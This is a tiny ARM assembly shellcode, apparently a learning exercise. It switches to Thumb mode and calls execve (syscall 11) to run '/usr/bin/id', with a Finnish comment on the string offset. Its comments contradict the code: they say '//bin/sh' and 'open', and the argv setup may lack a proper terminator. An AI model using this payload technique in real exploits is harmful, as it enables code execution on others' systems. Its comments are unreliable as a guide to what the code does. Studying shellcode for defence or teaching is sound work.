.section .text
.global _start

_start:

@ enter thumbmode
.code 32
add r6, pc, #1
bx r6

@ execve(const char *filename, char *const argv[],char *const envp[]);
@ r0: //bin/sh
@ r1: //bin/sh
@ r2: 0
.code 16
sub r2,r2,r2
mov r0, pc
add r0, #8    		@ 2 * rivimäärä ennen .ascii osiota
str r0, [sp, #4]
add r1, sp, #4
mov r7, #11      	@ open
svc 1

.ascii "/usr/bin/id"
